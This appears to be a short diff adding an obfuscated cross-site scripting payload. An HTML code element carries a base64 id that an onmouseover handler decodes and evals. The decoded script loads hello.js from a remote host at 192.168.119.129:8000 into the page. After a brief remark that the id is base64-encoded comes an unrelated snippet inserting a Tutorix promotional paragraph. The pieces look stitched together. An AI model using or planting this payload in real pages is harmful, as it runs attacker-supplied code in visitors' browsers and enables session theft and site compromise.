@@ -1,0 +1,6 @@
+<code  id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHA6Ly8xOTIuMTY4LjExOS4xMjk6ODAwMC9oZWxsby5qcyI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTsK; onmouseover=eval(atob(this.id))> THis is a description </code>
+
+id is encoded in base64
+
+
+para1 = document.createElement("p");var text = document.createTextNode("Tutorix is the best e-learning platform"); para1.appendChild(text); para1.setAttribute('id', 'Introduction_1');document.body.appendChild(para1);
